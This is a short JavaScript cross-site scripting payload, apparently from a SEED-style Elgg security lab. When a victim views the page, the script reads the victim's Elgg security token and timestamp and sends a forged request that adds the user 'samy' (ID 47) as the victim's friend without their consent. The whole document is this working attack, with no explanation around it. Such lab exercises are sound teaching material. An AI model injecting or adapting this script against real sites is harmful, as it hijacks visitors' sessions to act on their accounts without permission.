<script type="text/javascript">
    window.onload = function () {
    var Ajax=null;
    // set the timestap and secret token parameter
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    // Construct the HTTP request to add samy as a friend
    var sendurl="http://www.xsslabelgg.com/action/friends/add"+ "?friend=47"+token +ts;

    // Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET",sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type","application/x-www-from-urlencoded");
    Ajax.send();
}
</script>